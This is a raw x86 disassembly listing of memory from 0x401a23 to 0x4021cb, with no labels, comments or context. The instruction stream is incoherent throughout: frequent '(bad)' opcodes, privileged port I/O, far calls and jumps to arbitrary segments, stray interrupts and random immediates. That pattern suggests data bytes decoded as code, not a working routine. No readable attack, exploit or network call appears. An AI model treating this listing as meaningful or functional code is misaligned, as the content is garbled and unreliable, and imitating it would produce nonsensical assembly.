  401a23:	lock fnstcw WORD PTR [edx-0x3afd3756]
  401a2a:	jg     0x4019e8
  401a2c:	fbld   TBYTE PTR [edx-0x166bca6a]
  401a32:	out    dx,eax
  401a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a34:	xor    DWORD PTR [ebx-0x23af6f05],esi
  401a3a:	push   edx
  401a3b:	adc    al,0xbd
  401a3d:	fstp   DWORD PTR [ebx]
  401a3f:	add    ch,ah
  401a41:	push   es
  401a42:	aas    
  401a43:	cs loop 0x401a4b
  401a46:	mov    al,0x6
  401a48:	popf   
  401a49:	test   DWORD PTR [ebx-0x27fe4189],ebx
  401a4f:	xchg   edx,eax
  401a50:	xchg   esp,eax
  401a51:	stc    
  401a52:	(bad)  
  401a53:	pop    ebx
  401a54:	adc    eax,0xcc372ea1
  401a59:	sub    BYTE PTR [ebx+ebp*2],al
  401a5c:	or     al,0x6e
  401a5e:	mov    ecx,0x60271465
  401a63:	lods   al,BYTE PTR ds:[esi]
  401a64:	mov    dh,0xdb
  401a66:	adc    al,0xd4
  401a68:	imul   esi,edi,0x81dc9a59
  401a6e:	aam    0x36
  401a70:	ja     0x401aab
  401a72:	and    ah,BYTE PTR [ebx+0x6d89bbff]
  401a78:	pop    ss
  401a79:	jbe    0x401ada
  401a7b:	dec    eax
  401a7c:	(bad)  
  401a7d:	xchg   edi,eax
  401a7e:	jb     0x401a4a
  401a80:	mov    dh,0xbc
  401a82:	dec    esi
  401a83:	das    
  401a84:	dec    dl
  401a86:	cmp    DWORD PTR [ebx+0x1d],edi
  401a89:	(bad)  
  401a8a:	jge    0x401ac7
  401a8c:	mov    eax,0x16fc83f
  401a91:	xchg   esp,eax
  401a92:	and    eax,0xc32861ec
  401a97:	popf   
  401a98:	inc    eax
  401a99:	fcom   st(4)
  401a9b:	and    eax,0x15e9326a
  401aa0:	xor    al,0x80
  401aa2:	popf   
  401aa3:	cs into 
  401aa5:	lds    eax,FWORD PTR [ecx-0x12ff7b7a]
  401aab:	call   0x4a11:0xe1683448
  401ab2:	mov    cl,0xe2
  401ab4:	out    0xf,eax
  401ab6:	adc    BYTE PTR [eax],ah
  401ab8:	dec    DWORD PTR [edi+0x3c]
  401abb:	jo     0x401a8a
  401abd:	inc    esp
  401abe:	arpl   WORD PTR [ebp+0x0],dx
  401ac1:	aas    
  401ac2:	dec    ebp
  401ac3:	bound  edx,QWORD PTR [ecx]
  401ac5:	shl    BYTE PTR [ebp-0x5f],1
  401ac8:	mov    ebx,?
  401aca:	adc    eax,0x5b96b7ca
  401acf:	gs jno 0x401b35
  401ad2:	sbb    al,0x6e
  401ad4:	cs jae 0x401ae2
  401ad7:	retf   0xf057
  401ada:	imul   eax,DWORD PTR [edx],0xf6ae5cfd
  401ae0:	adc    eax,0xb5fa440
  401ae5:	dec    esi
  401ae6:	xor    eax,0xc9eb8e31
  401aeb:	push   eax
  401aec:	mov    cl,0x58
  401aee:	imul   eax,DWORD PTR ds:0x13caf12c,0x32
  401af5:	mov    edi,0x36da9798
  401afa:	sar    BYTE PTR [edx],0x3
  401afd:	cwde   
  401afe:	mov    ebx,0x53e3230d
  401b03:	push   es
  401b04:	mov    bl,0xb2
  401b06:	enter  0x90bb,0xd1
  401b0a:	repnz mov ds:0xf9a7c06e,eax
  401b10:	ficom  WORD PTR [eax+0x13562afc]
  401b16:	mov    dh,0xd5
  401b18:	inc    esp
  401b19:	adc    ch,BYTE PTR [esp+edi*4-0x20b87314]
  401b20:	addr16 add eax,0xd823b985
  401b26:	push   es
  401b27:	mov    ds:0x8aad0367,eax
  401b2c:	shl    dl,cl
  401b2e:	inc    edi
  401b2f:	enter  0xb272,0x64
  401b33:	pop    ebp
  401b34:	idiv   ah
  401b36:	ja     0x401b29
  401b38:	mov    WORD PTR [edx],cs
  401b3a:	push   0x24
  401b3c:	sbb    dl,BYTE PTR [esi]
  401b3e:	mov    ecx,0x75f524b4
  401b43:	sub    BYTE PTR [ebx-0x67d31e58],ah
  401b49:	cli    
  401b4a:	fadd   QWORD PTR [esi-0x27]
  401b4d:	into   
  401b4e:	jecxz  0x401ae1
  401b50:	stc    
  401b51:	xor    al,ah
  401b53:	iret   
  401b54:	mov    BYTE PTR [edi],cl
  401b56:	ja     0x401aec
  401b58:	(bad)  
  401b59:	cpuid  
  401b5b:	xor    al,BYTE PTR [ebx-0x3d2a4bf5]
  401b61:	call   FWORD PTR [eax]
  401b63:	(bad)  
  401b64:	leave  
  401b65:	add    cl,BYTE PTR [ecx]
  401b67:	mov    ecx,0x131624c5
  401b6c:	(bad)  
  401b6d:	mov    dh,0x5e
  401b6f:	mov    ds:0x299d9786,al
  401b74:	or     al,0x7f
  401b76:	add    DWORD PTR [edi],ebx
  401b78:	push   ss
  401b79:	ror    DWORD PTR [eax+0x4c27678b],0x32
  401b80:	mov    edx,0x4c06fe78
  401b85:	push   edi
  401b86:	adc    BYTE PTR [ebx-0x2],bl
  401b89:	or     BYTE PTR [edi],cl
  401b8b:	sahf   
  401b8c:	add    DWORD PTR [edx-0x310ed97f],ecx
  401b92:	cli    
  401b93:	dec    edx
  401b94:	jge    0x401b1e
  401b96:	inc    esp
  401b97:	jg     0x401bf0
  401b99:	fstp   QWORD PTR [eax]
  401b9b:	inc    edi
  401b9c:	xchg   dh,bl
  401b9e:	aad    0x48
  401ba0:	mov    WORD PTR ds:0xfbdb15e0,cs
  401ba6:	push   ebx
  401ba7:	jb     0x401bb0
  401ba9:	cmp    BYTE PTR [eax+0x54437a57],cl
  401baf:	and    BYTE PTR [esi-0x63],dh
  401bb2:	and    al,0x88
  401bb4:	xchg   edx,eax
  401bb5:	dec    edi
  401bb6:	mov    edx,0xb641cd6
  401bbb:	pusha  
  401bbc:	(bad)
  401bc0:	lea    ebp,[ebx]
  401bc2:	add    BYTE PTR [ecx+ecx*2],dl
  401bc5:	call   0x7ec9:0x40b5e44e
  401bcc:	mov    ds:0xd920bf1b,eax
  401bd1:	inc    edi
  401bd2:	or     BYTE PTR [ebx],dh
  401bd4:	push   0x80b6669e
  401bd9:	dec    edx
  401bda:	aaa    
  401bdb:	je     0x401c29
  401bdd:	sbb    al,0xa8
  401bdf:	inc    esi
  401be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401be1:	dec    ebx
  401be2:	cmp    eax,0xa38f309d
  401be7:	jge    0x401c57
  401be9:	retf   
  401bea:	ja     0x401c21
  401bec:	aam    0x58
  401bee:	push   esp
  401bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bf0:	sti    
  401bf1:	(bad)  
  401bf2:	mov    bh,0xcb
  401bf4:	adc    edi,esp
  401bf6:	scas   al,BYTE PTR es:[edi]
  401bf7:	jp     0x401bd7
  401bf9:	sahf   
  401bfa:	cmp    esi,DWORD PTR [ecx+0x65311c1f]
  401c00:	jae    0x401bce
  401c02:	push   ebx
  401c03:	ror    ah,0xbe
  401c06:	ret    
  401c07:	retf   0xae6c
  401c0a:	test   eax,ebp
  401c0c:	call   0xf53e9f7a
  401c11:	fcomp  QWORD PTR [edx+0x24]
  401c14:	sbb    BYTE PTR [ecx-0x77],cl
  401c17:	push   eax
  401c18:	push   edi
  401c19:	ror    BYTE PTR [ecx-0x1f],1
  401c1c:	mov    esi,0x5e48f595
  401c21:	pop    ebp
  401c22:	rcl    esi,1
  401c24:	xchg   esp,eax
  401c25:	pop    ebp
  401c26:	cmp    edx,eax
  401c28:	imul   esi,DWORD PTR [edi-0xb],0xffffff83
  401c2c:	outs   dx,DWORD PTR ds:[esi]
  401c2d:	(bad)  
  401c2e:	in     al,0x3c
  401c30:	jno    0x401c94
  401c32:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  401c34:	inc    esp
  401c35:	xchg   esi,eax
  401c36:	les    ecx,FWORD PTR [eax]
  401c38:	bound  ecx,QWORD PTR [eax]
  401c3a:	mov    edi,0x76951235
  401c3f:	fnstcw WORD PTR [edx]
  401c41:	add    DWORD PTR [ebp+0x7c],edx
  401c44:	or     DWORD PTR [eax],esp
  401c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c47:	lea    edx,[ebx+eax*4+0x67]
  401c4b:	mov    cl,BYTE PTR [esp+eax*4-0x58]
  401c4f:	xchg   ebp,eax
  401c50:	and    al,0x4b
  401c52:	cli    
  401c53:	mov    esp,0x4799fba5
  401c58:	push   ebp
  401c59:	cmp    al,0xff
  401c5b:	sub    ch,dl
  401c5d:	adc    al,BYTE PTR [esi]
  401c5f:	add    bl,BYTE PTR [esi+0x548ec07d]
  401c65:	adc    bh,BYTE PTR [ecx+0x12]
  401c68:	xor    ecx,DWORD PTR [edi-0x3910ebe]
  401c6e:	and    eax,0x2dac1b88
  401c73:	jg     0x401bf8
  401c75:	int3   
  401c76:	sub    eax,0x8d53e660
  401c7b:	push   ebp
  401c7c:	(bad)  
  401c7d:	xlat   BYTE PTR ds:[ebx]
  401c7e:	jle    0x401c88
  401c80:	retf   0xbdf8
  401c83:	(bad)  
  401c84:	cmp    ecx,edi
  401c86:	mov    edx,0xf5cac865
  401c8b:	pop    eax
  401c8c:	leavew 
  401c8e:	inc    edi
  401c8f:	scas   eax,DWORD PTR es:[edi]
  401c90:	xchg   ecx,eax
  401c91:	jl     0x401ce1
  401c93:	mov    WORD PTR [edx],cs
  401c95:	ins    BYTE PTR es:[edi],dx
  401c96:	hlt    
  401c97:	xlat   BYTE PTR ds:[ebx]
  401c98:	imul   cl
  401c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c9b:	add    DWORD PTR [esi+0x31],ecx
  401c9e:	cmp    eax,edi
  401ca0:	in     eax,0x21
  401ca2:	dec    edx
  401ca3:	pop    ds
  401ca4:	xchg   BYTE PTR [ebp-0x47],dl
  401ca7:	jb     0x401c62
  401ca9:	pop    edx
  401caa:	icebp  
  401cab:	xchg   edi,eax
  401cac:	rol    DWORD PTR [edx-0x74b6ef46],0x96
  401cb3:	xor    al,0xe
  401cb5:	stc    
  401cb6:	and    DWORD PTR [ebx+0x5a],ebp
  401cb9:	mov    ch,BYTE PTR [edx+0x5ab8bbe1]
  401cbf:	xor    al,0xa2
  401cc1:	sbb    BYTE PTR [ecx-0x1b],0xa6
  401cc5:	ins    DWORD PTR es:[edi],dx
  401cc6:	inc    esi
  401cc7:	xor    DWORD PTR [edx+0x3],edi
  401cca:	sub    cl,ch
  401ccc:	mov    WORD PTR [edx+0x3d4be7ea],cs
  401cd2:	mov    edx,0x7be16709
  401cd7:	and    al,0xc8
  401cd9:	mov    ch,0xb6
  401cdb:	jne    0x401cfa
  401cdd:	dec    esp
  401cde:	fnstenv [edi-0x5c767ba6]
  401ce4:	ret    
  401ce5:	add    eax,0x30133e1b
  401cea:	fucomp st(7)
  401cec:	pop    ss
  401ced:	mov    eax,ds:0xdfc108f5
  401cf2:	mov    dl,0xbb
  401cf5:	outs   dx,BYTE PTR ds:[esi]
  401cf6:	sub    DWORD PTR [esi-0x7],ebx
  401cf9:	das    
  401cfa:	lea    esi,[esp+edx*4-0x14f24aba]
  401d01:	mov    ecx,0x5817ae65
  401d06:	push   0xffffffb9
  401d08:	mov    dl,0xd3
  401d0a:	jmp    0xd6be:0x3accc643
  401d11:	sahf   
  401d12:	push   cs
  401d13:	push   ss
  401d14:	fist   WORD PTR [esi-0x2f]
  401d17:	call   0xbbe57224
  401d1c:	add    DWORD PTR [edx],0x5f
  401d1f:	jge    0x401ca6
  401d21:	outs   dx,BYTE PTR ds:[esi]
  401d22:	pop    esp
  401d23:	mov    bh,0xe4
  401d25:	in     eax,0x9
  401d27:	xchg   cl,ch
  401d29:	sbb    eax,0x9953e216
  401d2e:	mov    ebx,0xd210fad8
  401d33:	jns    0x9d60d96d
  401d39:	add    esp,DWORD PTR [eiz*2+0x37d7d427]
  401d40:	jecxz  0x401ce6
  401d42:	push   esi
  401d43:	mov    edi,0x933f0eec
  401d48:	(bad)  
  401d49:	push   ebp
  401d4a:	cmp    al,0x25
  401d4d:	and    DWORD PTR [ebx+0x2a],esp
  401d50:	mov    bl,0x5a
  401d52:	inc    ebx
  401d53:	(bad)  
  401d54:	adc    ebx,eax
  401d56:	jmp    0x401cfb
  401d58:	test   BYTE PTR [ecx+ebx*1-0x54e7baee],0x3c
  401d60:	(bad)  [esi-0x119f0397]
  401d66:	into   
  401d67:	(bad)  
  401d68:	in     eax,dx
  401d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d6a:	or     dh,dl
  401d6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d6d:	cmp    bl,0x8c
  401d70:	jns    0x401d2e
  401d72:	das    
  401d73:	push   0xffffff83
  401d75:	mov    ch,0x67
  401d77:	jle    0x401d7f
  401d79:	mov    esi,eax
  401d7b:	sub    al,0x7e
  401d7d:	adc    DWORD PTR [ebp+eiz*4-0x1f14aa78],ecx
  401d84:	adc    BYTE PTR ds:0x6a48c2d,dh
  401d8a:	mov    al,ds:0x452da6cc
  401d8f:	js     0x401dd3
  401d91:	inc    eax
  401d92:	fwait
  401d93:	xchg   DWORD PTR [ebx],edx
  401d95:	dec    esp
  401d97:	mov    ch,0xa1
  401d99:	sar    DWORD PTR [ecx+0x4a],1
  401d9c:	stos   DWORD PTR es:[edi],eax
  401d9d:	les    edx,FWORD PTR [edi-0x65]
  401da0:	ja     0x401db6
  401da2:	mov    ch,0xfa
  401da4:	cdq    
  401da5:	jmp    0x3792:0x6e0c1311
  401dac:	jb     0x401dc4
  401dae:	xchg   esp,eax
  401daf:	loop   0x401e09
  401db1:	xor    dl,bh
  401db3:	aam    0x7c
  401db5:	mov    eax,0xdde8ae24
  401dba:	pop    edx
  401dbb:	out    0xfb,al
  401dbd:	int    0xf1
  401dbf:	push   0x2b162c81
  401dc4:	dec    ebp
  401dc5:	arpl   WORD PTR [eax-0x79],bp
  401dc8:	mov    eax,0xc39a3554
  401dcd:	cmp    dh,bl
  401dcf:	scas   al,BYTE PTR es:[edi]
  401dd0:	mov    WORD PTR [ebp+0x1325e541],ss
  401dd6:	xor    bh,BYTE PTR [ebx]
  401dd8:	call   FWORD PTR [ebx-0x77]
  401ddb:	or     cl,BYTE PTR [ecx+0x2c]
  401dde:	sti    
  401ddf:	(bad)  
  401de0:	loopne 0x401db9
  401de2:	xchg   esi,eax
  401de3:	stos   BYTE PTR es:[edi],al
  401de4:	and    BYTE PTR [esi],dl
  401de6:	jb     0x401e4b
  401de8:	lods   eax,DWORD PTR ds:[esi]
  401de9:	xlat   BYTE PTR ds:[ebx]
  401dea:	inc    ecx
  401deb:	loop   0x401dd9
  401ded:	pop    ecx
  401dee:	inc    edi
  401def:	xchg   ecx,eax
  401df0:	iret   
  401df1:	push   ebx
  401df2:	dec    eax
  401df3:	lds    ebp,FWORD PTR ds:0x10d2b304
  401df9:	inc    eax
  401dfa:	xor    ah,ah
  401dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dfd:	gs (bad) 
  401dff:	loop   0x401e2b
  401e01:	nop
  401e02:	outs   dx,BYTE PTR ds:[esi]
  401e03:	ret    
  401e04:	das    
  401e05:	jbe    0x401db0
  401e07:	popa   
  401e08:	xchg   ebp,eax
  401e09:	xor    esi,edx
  401e0b:	dec    ecx
  401e0c:	dec    ebx
  401e0d:	scas   al,BYTE PTR es:[edi]
  401e0e:	out    dx,al
  401e0f:	cmp    DWORD PTR [ecx+0x44],esp
  401e12:	gs aam 0xe1
  401e15:	and    eax,0x550af607
  401e1a:	xor    DWORD PTR [ebx],ebx
  401e1c:	xor    ebx,DWORD PTR [edi]
  401e1e:	repnz pop esi
  401e20:	pop    ss
  401e21:	xchg   edx,eax
  401e22:	retf   0xc132
  401e25:	xor    eax,0xb856fe9a
  401e2a:	repnz inc edx
  401e2c:	xchg   ebp,eax
  401e2d:	xchg   ebp,eax
  401e2e:	inc    edx
  401e2f:	test   DWORD PTR [ecx-0x39],esi
  401e32:	div    dh
  401e34:	mov    dl,0xd0
  401e36:	push   0xec30cd9f
  401e3b:	les    edi,FWORD PTR [edx]
  401e3d:	popf   
  401e3e:	ins    BYTE PTR es:[edi],dx
  401e3f:	data16 (bad) 
  401e41:	(bad)  
  401e43:	xchg   ebp,eax
  401e44:	and    DWORD PTR [esi+0x18b6b197],ecx
  401e4a:	jg     0x401de3
  401e4c:	sub    al,0x7
  401e4e:	push   ss
  401e4f:	xchg   ebx,eax
  401e50:	inc    ebp
  401e51:	shr    BYTE PTR [eax+edi*2-0x10536da8],cl
  401e58:	adc    edi,DWORD PTR ds:0xaa703baf
  401e5e:	fild   DWORD PTR [edx-0x22cdb2b3]
  401e64:	lea    eax,[edi]
  401e66:	xchg   DWORD PTR [eax-0x34],edi
  401e69:	addr16 in eax,dx
  401e6b:	gs sub al,0x94
  401e6f:	in     eax,0x20
  401e71:	or     edi,edi
  401e73:	mov    ah,dl
  401e75:	in     al,0xe6
  401e77:	and    edi,0x70
  401e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e7b:	dec    ecx
  401e7c:	sub    al,0x92
  401e7e:	xchg   ecx,eax
  401e7f:	or     eax,0xb4e548f6
  401e84:	push   esi
  401e85:	push   ebx
  401e86:	pop    ebx
  401e87:	jecxz  0x401e72
  401e89:	adc    al,BYTE PTR [esi-0x57995889]
  401e8f:	imul   ebx,DWORD PTR [ecx+0x21],0x52800bb8
  401e96:	pop    edx
  401e97:	xchg   esi,eax
  401e98:	sbb    esp,esi
  401e9a:	and    al,0xab
  401e9c:	call   0x7a3f:0x87518927
  401ea3:	jae    0x401e88
  401ea5:	arpl   dx,di
  401ea7:	in     eax,0x6e
  401ea9:	fst    DWORD PTR [edi]
  401eab:	sbb    BYTE PTR [esi-0x1c],al
  401eae:	call   DWORD PTR [edi+ebp*4]
  401eb1:	mov    dh,0x5c
  401eb3:	setne  BYTE PTR ds:0x273b5d9e
  401eba:	xchg   edx,eax
  401ebb:	jae    0x401eb2
  401ebd:	push   ds
  401ebe:	aaa    
  401ebf:	loope  0x401e78
  401ec1:	push   esp
  401ec2:	arpl   WORD PTR [esi],dx
  401ec4:	popa   
  401ec5:	xchg   BYTE PTR ds:0xce4d2a32,al
  401ecc:	jl     0x401f37
  401ece:	push   ss
  401ecf:	inc    edx
  401ed0:	adc    BYTE PTR [ebx+0x5f],ah
  401ed3:	les    ecx,FWORD PTR [edx-0x23de2259]
  401ed9:	or     dh,BYTE PTR [edx+0x42a2d366]
  401edf:	dec    esi
  401ee0:	mov    ebp,DWORD PTR [ecx]
  401ee2:	cs mov ah,0xb4
  401ee5:	sbb    BYTE PTR [ecx-0x25],dh
  401ee8:	inc    ecx
  401ee9:	in     al,dx
  401eea:	jno    0x401f66
  401eec:	mov    edi,DWORD PTR [edi+0x1]
  401eef:	sub    BYTE PTR [edx],ah
  401ef1:	sub    DWORD PTR [ecx],ebx
  401ef3:	ffreep st(7)
  401ef5:	adc    eax,0x34e22c8e
  401efa:	inc    esi
  401efb:	inc    edi
  401efc:	sahf   
  401efd:	and    ch,BYTE PTR [eax-0xe]
  401f00:	jl     0x401eb2
  401f02:	shl    ebx,1
  401f04:	mov    dl,0x10
  401f06:	call   0xa44370dc
  401f0b:	pop    ss
  401f0c:	lods   eax,DWORD PTR ds:[esi]
  401f0d:	jbe    0x401ec4
  401f0f:	call   0xfb38e3f9
  401f14:	mov    al,ah
  401f16:	inc    eax
  401f17:	pusha  
  401f18:	xlat   BYTE PTR ds:[ebx]
  401f19:	cld    
  401f1a:	popa   
  401f1b:	mov    dh,0x77
  401f1d:	inc    eax
  401f1e:	sub    edx,DWORD PTR [ebp-0x9]
  401f21:	or     eax,0xf6c3f73
  401f26:	or     ebx,DWORD PTR [ecx-0x5c]
  401f29:	pusha  
  401f2a:	mov    DWORD PTR [edi-0x68],ecx
  401f2d:	and    BYTE PTR [esi+0x0],al
  401f30:	dec    eax
  401f31:	sub    al,0x2
  401f33:	movlps QWORD PTR [ecx+0x3d04c27d],xmm2
  401f3a:	(bad)  
  401f3b:	mov    eax,ds:0x341df3ff
  401f40:	scas   al,BYTE PTR es:[edi]
  401f41:	pop    es
  401f42:	xchg   esi,eax
  401f43:	push   ecx
  401f44:	hlt    
  401f45:	test   BYTE PTR [edi+0x12cd4d3a],bl
  401f4b:	inc    ebp
  401f4c:	sbb    edi,edx
  401f4e:	lods   eax,DWORD PTR ds:[esi]
  401f4f:	push   es
  401f50:	je     0x401f18
  401f52:	loope  0x401f51
  401f54:	dec    eax
  401f55:	test   DWORD PTR [edx+0x1eafb0e4],esp
  401f5b:	test   esi,edi
  401f5d:	mov    ?,ecx
  401f5f:	inc    ecx
  401f60:	or     esi,esi
  401f62:	jp     0x401f56
  401f64:	and    dl,bh
  401f66:	pop    ds
  401f67:	in     al,0x8f
  401f69:	inc    edx
  401f6a:	xchg   edx,eax
  401f6b:	loopne 0x401f5d
  401f6d:	out    dx,eax
  401f6e:	jg     0x401f80
  401f70:	test   DWORD PTR ds:[ebx-0x53193984],ecx
  401f77:	stc    
  401f78:	out    0xe,eax
  401f7a:	xlat   BYTE PTR ds:[ebx]
  401f7b:	daa    
  401f7c:	aaa    
  401f7d:	inc    edi
  401f7e:	dec    edi
  401f7f:	out    0x26,eax
  401f81:	loope  0x401f41
  401f83:	mov    al,0xb1
  401f85:	aaa    
  401f86:	(bad)  [edx-0x6894b07c]
  401f8c:	inc    ebp
  401f8d:	pushf  
  401f8e:	push   esp
  401f8f:	inc    ecx
  401f90:	jecxz  0x401f3f
  401f92:	lea    edx,[ecx]
  401f94:	mov    edx,0xa381b151
  401f99:	pusha  
  401f9a:	cmp    BYTE PTR [ebx-0x75ad7fb0],cl
  401fa0:	pop    ebp
  401fa1:	xchg   ebx,eax
  401fa2:	lea    edx,[esi+0x22874e50]
  401fa8:	sub    al,0x85
  401faa:	jmp    0xe397:0xd74b2842
  401fb1:	or     DWORD PTR [eax+eax*2+0x298077f6],0xfffffff1
  401fb9:	pusha  
  401fba:	xchg   ebp,eax
  401fbb:	push   ebp
  401fbc:	mov    ebx,0xfff3edf7
  401fc1:	ficom  WORD PTR [esi+0x38]
  401fc4:	push   esi
  401fc5:	pop    es
  401fc6:	retf   
  401fc7:	lea    ebx,[edx]
  401fc9:	cwde   
  401fca:	jns    0x401fa8
  401fcc:	add    esi,DWORD PTR [edx+0x6321745f]
  401fd2:	xchg   edi,eax
  401fd3:	add    al,0xbe
  401fd5:	sbb    BYTE PTR [eax+0x50],bh
  401fd8:	(bad)
  401fdd:	mov    bh,0xe8
  401fdf:	pop    ebx
  401fe0:	push   ebp
  401fe1:	cmp    BYTE PTR [ecx],bl
  401fe3:	ss test al,0x12
  401fe6:	mov    bl,0x8
  401fe8:	int3   
  401fe9:	cmp    al,0x96
  401feb:	dec    esi
  401fec:	xchg   ebx,eax
  401fed:	and    al,0xe0
  401fef:	fstp   DWORD PTR [edi]
  401ff1:	rcl    BYTE PTR [edx-0x641edb38],0x38
  401ff8:	pop    ebx
  401ff9:	add    eax,0xf0131096
  401ffe:	adc    DWORD PTR [ebx+0x723c84f2],ebp
  402004:	mov    edi,0x17e10c54
  402009:	jmp    0x7dcb4d4d
  40200e:	hlt    
  40200f:	ins    BYTE PTR es:[edi],dx
  402010:	xor    DWORD PTR [ebx+ecx*8+0x35],eax
  402014:	mov    ecx,0xd73a9a08
  402019:	test   esi,0x2ef60d92
  40201f:	or     al,0x23
  402021:	dec    ebx
  402022:	cmp    eax,0xe1364beb
  402027:	test   eax,0x504f6e34
  40202c:	mov    edx,0x1839b900
  402031:	inc    ecx
  402032:	(bad)  
  402034:	fisub  WORD PTR [ecx-0x57]
  402037:	mov    al,0xb2
  402039:	pop    edi
  40203a:	(bad)  [eax]
  40203c:	arpl   bp,di
  40203e:	clc    
  40203f:	shr    DWORD PTR [edx],cl
  402041:	pushf  
  402042:	pop    ss
  402043:	fdivr  st(5),st
  402045:	sbb    DWORD PTR [edx],edi
  402047:	adc    cl,bl
  402049:	cmp    al,0xb4
  40204b:	inc    edx
  40204c:	(bad)  
  40204e:	mov    BYTE PTR [edi-0x1],0x75
  402052:	aas    
  402053:	cld    
  402054:	mov    edx,0x36571ebf
  40205a:	cs push ebx
  40205c:	out    dx,eax
  40205d:	lea    edx,[edi-0x5a]
  402060:	push   edi
  402061:	xchg   ebp,eax
  402062:	loopne 0x401ffa
  402064:	outs   dx,BYTE PTR ds:[esi]
  402065:	inc    edi
  402066:	mov    ah,0xb1
  402068:	xor    BYTE PTR [edi+0x6d],0xa7
  40206c:	xchg   edi,eax
  40206d:	loope  0x40206d
  40206f:	dec    edx
  402070:	lods   al,BYTE PTR ds:[esi]
  402071:	mov    dh,dh
  402073:	test   eax,0xbe83e2a8
  402078:	mov    ds:0xca306589,al
  40207d:	pop    ds
  40207e:	ficom  DWORD PTR cs:[ebx]
  402081:	mov    ecx,0xb663012e
  402086:	(bad)  
  402087:	mov    DWORD PTR [eax-0x72],0xd2c99fdc
  40208e:	mov    bl,0x34
  402090:	fwait
  402091:	jmp    0x40208a
  402093:	retf   
  402094:	bnd jle 0x402032
  402097:	cmp    eax,0x44de9d55
  40209c:	sbb    BYTE PTR [edi*8+0x41d4d17d],ch
  4020a3:	mov    BYTE PTR ds:0x8289b4ed,0xdf
  4020aa:	and    al,BYTE PTR [edx-0x6b]
  4020ad:	mov    dl,0x43
  4020af:	jne    0x402060
  4020b1:	test   eax,0x15ab954
  4020b6:	fbld   TBYTE PTR [esi]
  4020b8:	int    0x38
  4020ba:	in     al,0x77
  4020bc:	test   eax,0x6032f43e
  4020c1:	lods   eax,DWORD PTR ds:[esi]
  4020c2:	push   es
  4020c3:	dec    eax
  4020c4:	push   esp
  4020c5:	outs   dx,BYTE PTR ds:[esi]
  4020c6:	test   DWORD PTR [esi+0x0],edi
  4020c9:	outs   dx,DWORD PTR ds:[esi]
  4020ca:	shr    ebx,0xb4
  4020cd:	xlat   BYTE PTR ds:[ebx]
  4020ce:	xchg   edx,eax
  4020cf:	and    al,BYTE PTR [eax-0x17480728]
  4020d5:	push   edx
  4020d6:	les    ebx,FWORD PTR [eax-0x29]
  4020d9:	test   BYTE PTR [ecx],bh
  4020db:	jmp    0xb4d33747
  4020e0:	idiv   ebp
  4020e2:	icebp  
  4020e3:	cmp    BYTE PTR ds:0x4beac833,al
  4020e9:	adc    ah,al
  4020eb:	(bad)  
  4020ec:	and    DWORD PTR [edx+0x692e24eb],esi
  4020f2:	sbb    DWORD PTR [ebx+0x12],ebp
  4020f5:	hlt    
  4020f6:	mov    ebp,0xd1072494
  4020fb:	rcl    ch,cl
  4020fd:	outs   dx,DWORD PTR ds:[esi]
  4020fe:	icebp  
  4020ff:	adc    al,0xaa
  402101:	pop    ds
  402102:	mov    BYTE PTR [ecx+0xa],ah
  402105:	add    al,0x56
  402107:	(bad)  
  402108:	call   0x79096aa2
  40210d:	xor    BYTE PTR [ecx-0x7330ee2f],bl
  402113:	mov    ebx,0x74eb20ec
  402118:	mov    ch,0xd7
  40211a:	sub    esi,DWORD PTR [edx-0x64]
  40211d:	cli    
  40211e:	or     al,0x46
  402120:	shr    edi,0x91
  402123:	sub    ebx,ecx
  402125:	sbb    BYTE PTR ds:0x54897abc,bl
  40212b:	test   eax,0x15599969
  402130:	jmp    0x4020f1
  402132:	mul    DWORD PTR [ecx-0x34]
  402135:	test   DWORD PTR [ebx+0x12],0x61836b9e
  40213c:	cmp    eax,0x93e3f352
  402141:	pusha  
  402142:	xchg   DWORD PTR [edx+0x4b],edx
  402145:	hlt    
  402146:	xchg   ecx,eax
  402147:	out    0x52,eax
  402149:	and    DWORD PTR [edi+0x4c97f0ac],ebx
  40214f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402150:	mov    dl,dl
  402152:	popf   
  402153:	lock out dx,eax
  402155:	ror    BYTE PTR [edx+0xe50b673],0x1c
  40215c:	or     eax,0xe0abcd82
  402161:	xchg   ecx,eax
  402162:	jl     0x4021af
  402164:	add    esi,DWORD PTR [edi+0x40c4ea9c]
  40216a:	hlt    
  40216b:	mov    bl,bh
  40216d:	outs   dx,DWORD PTR ds:[esi]
  40216e:	ret    
  40216f:	sub    esi,DWORD PTR [ebp-0x64]
  402172:	xchg   edi,eax
  402173:	cli    
  402174:	xor    ebx,DWORD PTR [ebp-0x3b]
  402177:	jl     0x4021c0
  402179:	mov    ch,BYTE PTR [esi-0x1c]
  40217c:	ds pop ebp
  40217e:	sub    bl,BYTE PTR [esp+edx*8-0x1e]
  402182:	cmp    al,0x5c
  402184:	outs   dx,BYTE PTR ds:[esi]
  402185:	fild   DWORD PTR [edi]
  402187:	inc    ebx
  402188:	cld    
  402189:	mov    edi,0x86c9e301
  40218e:	call   0x22daaf3f
  402193:	or     esp,DWORD PTR [ebp+esi*4+0x60]
  402197:	call   0xf52b8190
  40219c:	mov    ecx,0x65f492f4
  4021a1:	jp     0x40216f
  4021a3:	add    ebp,DWORD PTR [edx-0xf]
  4021a6:	push   cs
  4021a7:	int    0xe4
  4021a9:	in     eax,0xca
  4021ab:	hlt    
  4021ac:	dec    ecx
  4021ad:	mov    edx,ecx
  4021af:	mov    ds,esi
  4021b1:	pop    edx
  4021b2:	push   ebp
  4021b3:	daa    
  4021b4:	or     BYTE PTR [edx],bh
  4021b6:	sub    bl,dl
  4021b8:	shl    cl,cl
  4021ba:	xchg   BYTE PTR ds:0x16c910a9,ch
  4021c0:	ficomp WORD PTR [esi]
  4021c2:	test   al,0x76
  4021c4:	mov    bh,0xde
  4021c6:	jb     0x4021ef
  4021c8:	push   ss
  4021c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021ca:	push   ss
  4021cb:	loop   0x4021c3
